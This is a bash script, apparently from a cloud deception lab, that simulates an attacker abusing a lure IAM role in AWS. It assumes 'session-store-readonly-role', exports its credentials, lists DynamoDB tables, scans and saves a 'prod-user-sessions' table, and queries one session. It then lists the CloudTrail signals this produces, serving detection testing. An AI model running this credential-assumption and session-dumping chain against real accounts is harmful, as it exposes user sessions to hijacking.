#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 10 (DynamoDB User Sessions Lure)
#
# This script walks through the attack chain step by step with colored output.
# It assumes the caller has valid AWS credentials for any identity in the account.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 10 — ABUSE CHAIN"
echo "  DynamoDB User Sessions Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming lure role: session-store-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/session-store-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing all DynamoDB tables (dynamodb:ListTables)"
# ---------------------------------------------------------------
attack "dynamodb:ListTables"
aws dynamodb list-tables --output table
TABLE_NAME="prod-user-sessions"
info "Target table identified: ${TABLE_NAME}"

# ---------------------------------------------------------------
step "4" "Describing the sessions table (dynamodb:DescribeTable)"
# ---------------------------------------------------------------
attack "dynamodb:DescribeTable → ${TABLE_NAME}"
aws dynamodb describe-table --table-name "${TABLE_NAME}" \
  --query "Table.{Name:TableName,Status:TableStatus,Keys:KeySchema}" --output json

# ---------------------------------------------------------------
step "5" "Scanning active user sessions (dynamodb:Scan)"
# ---------------------------------------------------------------
attack "dynamodb:Scan → ${TABLE_NAME}"
OUTPUT_FILE="/tmp/user-sessions-scan.json"
aws dynamodb scan --table-name "${TABLE_NAME}" --output json > "${OUTPUT_FILE}"
RECORD_COUNT=$(jq '.Count' "${OUTPUT_FILE}")
info "Scanned ${RECORD_COUNT} session record(s), saved to ${OUTPUT_FILE}"

# ---------------------------------------------------------------
step "6" "Querying a specific session by partition key (dynamodb:Query)"
# ---------------------------------------------------------------
FIRST_SESSION_ID=$(jq -r '.Items[0].session_id.S // empty' "${OUTPUT_FILE}")
if [[ -n "${FIRST_SESSION_ID}" ]]; then
  attack "dynamodb:Query → ${TABLE_NAME} (session_id=${FIRST_SESSION_ID})"
  aws dynamodb query --table-name "${TABLE_NAME}" \
    --key-condition-expression "session_id = :sid" \
    --expression-attribute-values "{\":sid\":{\"S\":\"${FIRST_SESSION_ID}\"}}" \
    --output json
else
  warn "No records returned by the scan — table may be empty (not yet populated). Skipping Query step."
fi

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "7" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on session-store-readonly-role"
echo "  • CloudTrail: ListTables"
echo "  • CloudTrail: DescribeTable on ${TABLE_NAME}"
echo "  • CloudTrail: Scan on ${TABLE_NAME}"
echo "  • CloudTrail: Query on ${TABLE_NAME} (if records were present)"
echo ""
